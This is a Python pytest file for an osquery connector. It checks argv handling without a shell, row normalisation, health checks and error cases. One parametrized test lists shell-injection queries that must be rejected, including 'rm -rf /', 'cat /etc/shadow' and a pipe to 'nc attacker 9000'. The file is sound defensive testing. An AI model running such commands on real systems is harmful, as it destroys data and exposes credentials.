"""Unit tests for the osquery host connector (injected runner, no real binary)."""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any

import pytest

from general_ludd.connectors.osquery import OsquerySource


@dataclass
class FakeResult:
    returncode: int = 0
    stdout: str = ""
    stderr: str = ""


@dataclass
class FakeRunner:
    """Canned runner; records the argv it was called with."""

    result: FakeResult = field(default_factory=FakeResult)
    calls: list[list[str]] = field(default_factory=list)

    def __call__(self, argv: Any) -> FakeResult:
        self.calls.append(list(argv))
        return self.result


def test_kind_and_name() -> None:
    src = OsquerySource(config={"name": "host-osq"}, runner=FakeRunner())
    assert src.KIND == "metrics"
    assert src.name == "host-osq"


def test_query_normalizes_rows() -> None:
    rows = [{"hostname": "box1", "cpu_logical_cores": "8"}]
    runner = FakeRunner(FakeResult(stdout=json.dumps(rows)))
    src = OsquerySource(runner=runner)

    records = src.query({"query": "SELECT hostname, cpu_logical_cores FROM system_info", "table": "system_info"})

    # one record per column
    assert len(records) == 2
    keys = {r["message"] for r in records}
    assert keys == {"system_info.hostname", "system_info.cpu_logical_cores"}
    for rec in records:
        assert rec["source"] == "osquery"
        assert rec["kind"] == "metrics"
        assert rec["level_or_status"] == "ok"
        assert set(rec["labels"]) == {"hostname", "cpu_logical_cores"}
        assert rec["raw"]["table"] == "system_info"
        assert rec["raw"]["row"] == rows[0]
    # numeric column coerced to int
    cores = next(r for r in records if r["message"].endswith("cpu_logical_cores"))
    assert cores["value"] == 8


def test_query_passes_single_argv_element_no_shell() -> None:
    runner = FakeRunner(FakeResult(stdout="[]"))
    src = OsquerySource(config={"binary": "osqueryi"}, runner=runner)
    sql = "SELECT name, path FROM processes WHERE pid = 1"

    src.query({"query": sql})

    assert runner.calls == [["osqueryi", "--json", sql]]
    # the SQL is exactly one argv element — never spliced/shell-joined
    assert runner.calls[0][2] == sql


def test_infer_table_from_sql_when_not_given() -> None:
    runner = FakeRunner(FakeResult(stdout=json.dumps([{"x": "1"}])))
    src = OsquerySource(runner=runner)
    records = src.query({"query": "select x from osquery_info"})
    assert records[0]["message"] == "osquery_info.x"


@pytest.mark.parametrize(
    "bad",
    [
        "SELECT 1; rm -rf /",
        "SELECT $(whoami)",
        "SELECT `id`",
        "SELECT 1 | nc attacker 9000",
        "SELECT 1 && cat /etc/shadow",
        "-version",
        "   ",
        "",
    ],
)
def test_injection_like_query_rejected(bad: str) -> None:
    runner = FakeRunner()
    src = OsquerySource(runner=runner)
    with pytest.raises(ValueError):
        src.query({"query": bad})
    # rejected before any runner invocation
    assert runner.calls == []


def test_sql_punctuation_is_allowed() -> None:
    runner = FakeRunner(FakeResult(stdout="[]"))
    src = OsquerySource(runner=runner)
    # commas, parens, =, <, >, quotes, * are legitimate SQL and must pass
    src.query({"query": "SELECT * FROM users WHERE uid >= 1000 AND name = 'root'"})
    assert len(runner.calls) == 1


def test_health_ok() -> None:
    runner = FakeRunner(FakeResult(returncode=0, stdout="[]"))
    src = OsquerySource(runner=runner)
    health = src.health()
    assert health["ok"] is True
    assert "detail" in health
    assert runner.calls[0] == ["osqueryi", "--json", "SELECT 1"]


def test_health_not_ok_on_nonzero_exit() -> None:
    runner = FakeRunner(FakeResult(returncode=1, stderr="boom"))
    src = OsquerySource(runner=runner)
    health = src.health()
    assert health["ok"] is False
    assert "boom" in health["detail"]


def test_health_never_raises_on_runner_exception() -> None:
    class Boom:
        def __call__(self, argv: Any) -> FakeResult:
            raise OSError("exec format error")

    src = OsquerySource(runner=Boom())
    health = src.health()
    assert health["ok"] is False
    assert "OSError" in health["detail"]


def test_query_raises_on_nonzero_exit() -> None:
    runner = FakeRunner(FakeResult(returncode=2, stderr="no such table"))
    src = OsquerySource(runner=runner)
    with pytest.raises(RuntimeError, match="no such table"):
        src.query({"query": "SELECT 1 FROM nope"})


def test_query_raises_on_non_json_output() -> None:
    runner = FakeRunner(FakeResult(stdout="not json at all"))
    src = OsquerySource(runner=runner)
    with pytest.raises(RuntimeError, match="non-JSON"):
        src.query({"query": "SELECT 1"})
